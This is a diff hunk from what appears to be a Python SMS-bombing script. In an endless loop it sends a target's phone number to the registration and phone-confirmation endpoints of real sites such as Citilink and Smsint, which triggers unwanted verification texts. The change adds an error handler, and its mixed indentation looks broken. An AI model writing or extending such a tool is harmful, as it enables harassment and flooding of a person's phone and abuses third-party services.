@@ -100,7 +100,8 @@ while True:
 	try:
 		requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
 		print('[+] Citilink отправлено!')
-
+        except:
+		print('[-] Не отправлено!')
 	try:
 		requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
 		print('[+] Smsint отправлено!')
